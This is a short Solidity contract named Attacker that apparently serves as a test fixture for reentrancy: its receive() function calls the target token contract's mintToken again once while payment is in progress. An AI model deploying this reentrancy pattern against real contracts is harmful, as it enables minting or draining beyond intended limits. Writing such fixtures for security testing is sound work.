// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.9;

import "../interfaces/ITokenContract.sol";

contract Attacker {
    struct MintParams {
        string tokenURI;
    }

    ITokenContract public tokenContract;
    MintParams public params;
    uint256 public counter;

    constructor(address tokenContract_, MintParams memory params_) {
        tokenContract = ITokenContract(tokenContract_);

        params = params_;
    }

    receive() external payable {
        if (counter < 1) {
            counter++;

            tokenContract.mintToken(params.tokenURI);
        }
    }

    function mintToken() external payable {
        tokenContract.mintToken{value: msg.value}(params.tokenURI);
    }
}
